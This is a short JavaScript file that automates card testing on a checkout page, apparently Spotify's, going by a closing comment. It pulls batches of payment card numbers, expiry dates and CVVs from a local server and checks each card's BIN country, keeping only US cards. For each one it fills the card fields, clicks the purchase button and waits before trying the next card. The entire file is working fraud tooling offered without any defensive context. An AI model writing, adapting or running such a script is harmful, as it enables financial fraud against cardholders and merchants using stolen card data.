var url = "http://localhost:5000/post";
var json = {};
var iteration = function() {};
var jsonp_callback = function(arr) {
	var i = 0;
	var len = arr.length;

	iteration = function() {
        if( i < 3 ) {
            json = arr[i];
            i++;

            jsonp = function( data ) {
                if( data.ctry2 == "US" ) {
                    $("#cardnumber").val(json.card);
                    $("#expiry-month").val(json.mon);
                    $("#expiry-year").val("20" + json.year);
                    $("#security-code").val(json.cvv);
                    var button = $($(".btn.btn-family.btn-sm.center-block.purchasebutton")[0]);
                    button.click();
                    setTimeout(function() {
                        var interval = setInterval(function() {
                            console.log("Procesando...")
                            if ( !button.hasClass("disabled") ) {
                              console.log("Probemos la proxima");
                              clearInterval(interval);
                              iteration();
                            }
                        }, 1000);
                    }, 1000)
                }
                else {
                    console.log("No es de usa");
                    iteration();
                }
            } 

            reqInfo( json.card );

        }
        else {
            reqCC();
        }

	}

	iteration();
};

var jsonp;
var reqInfo = function( card ) {
  jQuery.ajax({
    url:"http://localhost:5000/info?bin=" + card,
    dataType: "jsonp"
  });
}

var reqCC = function() {
  jQuery.ajax({
       url:url,
       dataType: "jsonp"
  });
};
reqCC();
// Spotify
